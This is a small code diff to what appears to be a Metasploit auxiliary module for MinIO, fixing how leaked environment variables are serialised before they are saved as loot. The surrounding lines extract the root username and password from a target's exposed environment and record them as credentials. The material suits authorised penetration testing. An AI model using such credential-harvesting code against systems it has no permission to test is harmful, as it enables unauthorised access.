@@ -93,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
       creds['password'] = value if key == 'MINIO_ROOT_PASSWORD'
     end
 
-    path = store_loot('minio.env.json', 'application/json', rhost, json, 'minio.env.json', 'MinIO Environmental Variables Json')
+    path = store_loot('minio.env.json', 'application/json', rhost, json.to_json, 'minio.env.json', 'MinIO Environmental Variables Json')
     report_cred(creds) if creds.key?('user') && creds.key?('password')
     print_good("MinIO Environmental Variables Json Saved to: #{path}")
   end
